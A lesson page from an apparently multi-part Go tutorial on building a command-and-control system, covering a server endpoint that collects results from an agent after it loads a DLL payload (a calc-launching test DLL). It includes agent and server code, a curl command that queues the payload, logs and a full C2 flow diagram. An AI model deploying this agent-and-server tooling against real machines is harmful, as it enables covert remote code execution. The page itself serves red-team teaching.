---
showTableOfContents: true
title: "Lesson 11: Server Receives and Displays Results"
type: "page"
---
## Solutions

The starting solution can be found here.

The final solution can be found here.



## Overview

We've successfully executed shellcode on the agent, and the agent is sending results back to the server. However, the server doesn't have an endpoint to receive and display these results yet.

In this lesson, we'll:

1. Create the `/results` endpoint on the server
2. Implement a handler to receive and parse results
3. Display success/failure messages with job correlation
4. Test the complete round-trip flow

This completes the feedback loop - we can now send commands, execute them, and see the results!

## What We'll Create

- `/results` POST endpoint in `server.go`
- `ResultHandler` function to process incoming results
- Logic to unmarshal and display command-specific results

## Review What We Have

In Lesson 8, we created `SendResult()` on the agent side:

```go
func (agent *Agent) SendResult(resultData []byte) error {
	targetURL := fmt.Sprintf("https://%s/results", agent.serverAddr)
	
	// Create HTTP POST request
	req, err := http.NewRequest(http.MethodPost, targetURL, bytes.NewReader(resultData))
	if err != nil {
		return fmt.Errorf("failed to create http results request: %w", err)
	}
	
	req.Header.Set("Content-Type", "application/json")
	
	// Execute the request
	resp, err := agent.client.Do(req)
	if err != nil {
		return fmt.Errorf("http results post request failed: %w", err)
	}
	defer resp.Body.Close()
	
	log.Printf("💥 SUCCESSFULLY SENT FINAL RESULTS BACK TO SERVER.")
	return nil
}
```

This sends a POST request to `/results` with the `AgentTaskResult` marshaled as JSON.

**What's being sent:**

```json
{
  "job_id": "job_123456",
  "success": true,
  "command_result": "\"DLL loaded and export 'LaunchCalc' called successfully.\"",
  "error": null
}
```

Now we need to receive and display this on the server.

## Add the Results Endpoint

First, let's register the endpoint in the server's `Start()` method. Update `server/server.go`:

```go
// Start implements Server.Start for HTTPS
func (server *Server) Start() error {
	// Create Chi router
	r := chi.NewRouter()

	// Define our GET endpoint
	r.Get("/", RootHandler)

	// Define our POST endpoint for results
	r.Post("/results", ResultHandler)  // NEW

	// Create the HTTP server
	server.server = &http.Server{
		Addr:    server.addr,
		Handler: r,
	}

	// Start the server
	return server.server.ListenAndServeTLS(server.tlsCert, server.tlsKey)
}
```

**What we added:**

```go
r.Post("/results", ResultHandler)
```

This registers a POST endpoint at `/results` that calls `ResultHandler` when hit.


## Implement ResultHandler

Now let's create the handler function. Add this to `server/server.go`:

```go
// ResultHandler receives and displays the result from the Agent
func ResultHandler(w http.ResponseWriter, r *http.Request) {
	log.Printf("Endpoint %s has been hit by agent\n", r.URL.Path)

	var result models.AgentTaskResult

	// Decode the incoming result
	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
		log.Printf("ERROR: Failed to decode JSON: %v", err)
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode("error decoding JSON")
		return
	}

	// Unmarshal the CommandResult to get the actual message string
	var messageStr string
	if len(result.CommandResult) > 0 {
		if err := json.Unmarshal(result.CommandResult, &messageStr); err != nil {
			log.Printf("ERROR: Failed to unmarshal CommandResult: %v", err)
			messageStr = string(result.CommandResult) // Fallback to raw bytes as string
		}
	}

	if !result.Success {
		log.Printf("Job (ID: %s) has failed\nMessage: %s\nError: %v", result.JobID, messageStr, result.Error)
	} else {
		log.Printf("Job (ID: %s) has succeeded\nMessage: %s", result.JobID, messageStr)
	}
}
```

Let's break this down step by step:

### Step 1: Log the Request

```go
log.Printf("Endpoint %s has been hit by agent\n", r.URL.Path)
```

**What it does:** Simple visibility - we know the agent contacted the results endpoint.

### Step 2: Decode the Result

```go
var result models.AgentTaskResult

// Decode the incoming result
if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
	log.Printf("ERROR: Failed to decode JSON: %v", err)
	w.WriteHeader(http.StatusBadRequest)
	json.NewEncoder(w).Encode("error decoding JSON")
	return
}
```

**What it does:**

1. Create an empty `AgentTaskResult` struct
2. Decode the JSON from the request body into the struct
3. If decoding fails (corrupted data, wrong format), log the error and return 400

**Why this matters:** The agent sends JSON, and we need to parse it into our typed struct to access the fields.

### Step 3: Unmarshal CommandResult

```go
// Unmarshal the CommandResult to get the actual message string
var messageStr string
if len(result.CommandResult) > 0 {
	if err := json.Unmarshal(result.CommandResult, &messageStr); err != nil {
		log.Printf("ERROR: Failed to unmarshal CommandResult: %v", err)
		messageStr = string(result.CommandResult) // Fallback to raw bytes as string
	}
}
```

**Understanding the problem:**

Remember that `CommandResult` is `json.RawMessage` (raw JSON bytes). Different commands have different result structures:

- Shellcode: Just a message string
- Download: Might be `{"filename": "data.txt", "size": 1024}`
- Shell command: Might be `{"stdout": "...", "stderr": "..."}`

For our shellcode command, the orchestrator did this:

```go
outputJSON, _ := json.Marshal(string(shellcodeResult.Message))
finalResult.CommandResult = outputJSON
```

So `CommandResult` contains: `"\"DLL loaded and export 'LaunchCalc' called successfully.\""`

That's a JSON-encoded string, so we need to unmarshal it to get the actual string value.

**What the code does:**

1. Check if `CommandResult` has data
2. Try to unmarshal it into a string
3. If unmarshaling fails, fall back to converting the raw bytes to a string
4. Store the result in `messageStr`

**Why the fallback?** If the result format changes or is unexpected, we still get something readable rather than failing completely.


### Step 4: Display the Result

```go
if !result.Success {
	log.Printf("Job (ID: %s) has failed\nMessage: %s\nError: %v", result.JobID, messageStr, result.Error)
} else {
	log.Printf("Job (ID: %s) has succeeded\nMessage: %s", result.JobID, messageStr)
}
```

**Check success status:**
```go
if !result.Success
```

If the command failed, we display the failure message.

**Display failure:**

```go
log.Printf("Job (ID: %s) has failed\nMessage: %s\nError: %v", result.JobID, messageStr, result.Error)
```

Shows:
- The job ID (for correlation with the dispatched command)
- The message from the doer
- The error that occurred


**Display success:**
```go
log.Printf("Job (ID: %s) has succeeded\nMessage: %s", result.JobID, messageStr)
```

Shows:
- The job ID
- The success message from the doer


**Why job ID matters:** When you have multiple commands in flight, the job ID lets you correlate results with the specific command that was dispatched.





## Test the Complete Flow

Now we can test the entire round-trip!

**Step 1: Start the server**

```bash
go run ./cmd/server
```

**Expected output:**

```bash
2025/11/07 13:53:52 Starting Control API on :8080
2025/11/07 13:53:52 Starting server on 0.0.0.0:8443
```

**Step 2: Queue a command**

```bash
curl -X POST http://localhost:8080/command \
  -d '{
    "command": "shellcode",
    "data": {
      "file_path": "./payloads/calc.dll",
      "export_name": "LaunchCalc"
    }
  }'
```

**Expected client response:**

```bash
"Received command: shellcode"
```

**Expected server output:**

```bash
2025/11/07 13:53:57 Received command: shellcode
2025/11/07 13:53:57 Validation passed: file_path=./payloads/calc.dll, export_name=LaunchCalc
2025/11/07 13:53:57 Processed file: ./payloads/calc.dll (111493 bytes) -> base64 (148660 chars)
2025/11/07 13:53:57 Processed command arguments: shellcode
2025/11/07 13:53:57 QUEUED: shellcode
```

**Step 3: Run the agent (on Windows)**

```powershell
.\agent.exe
```

**Expected agent output (abbreviated):**

```bash
2025/11/07 13:54:03 Job received from Server
-> Command: shellcode
-> JobID: job_543370
2025/11/07 13:54:03 AGENT IS NOW PROCESSING COMMAND shellcode with ID job_543370
2025/11/07 13:54:03 |✅ SHELLCODE ORCHESTRATOR| Task ID: job_543370...
[... execution logs ...]
2025/11/07 13:54:03 |👊 SHELLCODE SUCCESS| Shellcode execution initiated successfully...
2025/11/07 13:54:03 |AGENT TASK|-> Sending result for Task ID job_543370 (114 bytes)...
2025/11/07 13:54:03 💥 SUCCESSFULLY SENT FINAL RESULTS BACK TO SERVER.
```

**Step 4: Check the server**

**NEW: Expected server output (results received):**

```bash
2025/11/07 13:54:03 Endpoint / has been hit by agent
2025/11/07 13:54:03 DEQUEUED: Command 'shellcode'
2025/11/07 13:54:03 Sending command to agent: shellcode
2025/11/07 13:54:03 Job ID: job_543370
2025/11/07 13:54:03 Endpoint /results has been hit by agent
2025/11/07 13:54:03 Job (ID: job_543370) has succeeded
Message: DLL loaded and export 'LaunchCalc' called successfully.
```

**Analyzing the complete flow:**

1. ✓ Operator queues command via curl
2. ✓ Server validates, processes, queues
3. ✓ Agent checks in, receives command
4. ✓ Agent executes shellcode (calc.exe launches)
5. ✓ Agent sends results to server
6. ✓ **Server receives and displays results** ← NEW!

The loop is complete!

## Understanding the Complete Data Flow

Let's trace a single command through the entire system:

```
┌──────────────────────────────────────────────────────────────┐
│ COMPLETE COMMAND & CONTROL FLOW                              │
└──────────────────────────────────────────────────────────────┘

1. Operator → Server (curl)
   POST /command
   {
     "command": "shellcode",
     "data": {
       "file_path": "./payloads/calc.dll",
       "export_name": "LaunchCalc"
     }
   }

2. Server Processing
   ├─ Validate: "shellcode" exists ✓
   ├─ Validate: file exists, export name present ✓
   ├─ Process: Read DLL, convert to base64
   └─ Queue: Add to AgentCommands queue

3. Agent → Server (periodic check-in)
   GET /
   
4. Server → Agent (if command in queue)
   {
     "job": true,
     "job_id": "job_543370",
     "command": "shellcode",
     "data": {
       "shellcode_base64": "TVqQAAMAAAAEAAAA...",
       "export_name": "LaunchCalc"
     }
   }

5. Agent Processing
   ├─ ExecuteTask: Route to orchestrateShellcode
   ├─ Orchestrator: Validate, decode base64
   ├─ Doer: Load DLL, resolve imports, call export
   └─ Build result: {job_id, success, message, error}

6. Agent → Server (results)
   POST /results
   {
     "job_id": "job_543370",
     "success": true,
     "command_result": "\"DLL loaded...\"",
     "error": null
   }

7. Server Display ← WE ARE HERE
   Log: "Job (ID: job_543370) has succeeded
        Message: DLL loaded and export 'LaunchCalc' called successfully."
```




## Conclusion

In this lesson, we've completed the feedback loop:

- Created the `/results` POST endpoint
- Implemented `ResultHandler` to receive and parse results
- Extracted and displayed command-specific messages
- Handled both success and failure cases
- Tested the complete round-trip flow

Our system is now complete:

- ✓ Receive and validate commands
- ✓ Process arguments
- ✓ Queue commands
- ✓ Send to agents
- ✓ Execute on agents
- ✓ **Receive and display results** ← NEW!

We have a fully functional command and control system! In the next lesson, we'll wrap up with a comprehensive review and discuss potential extensions.



___
[|TOC|]({{< ref "./moc.md" >}})
[|PREV|]({{< ref "./10_doer.md" >}})
[|NEXT|]({{< ref "./12_conclusion.md" >}})